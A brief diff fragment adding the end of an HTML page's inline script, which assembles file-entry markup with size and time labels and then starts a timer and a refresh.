+      + '<div class="mmeta"><span class="tag ' + mk + '">' + label + '</span><span>' + fmtSize(f && f.size) + '</span></div>'
+      + '<div class="mmeta">' + fmtTime(c.time) + '</div></div></div>';
+  }).join("");
+}
+
+startTimer();
+refresh();
+</script>
+</body>
+</html>
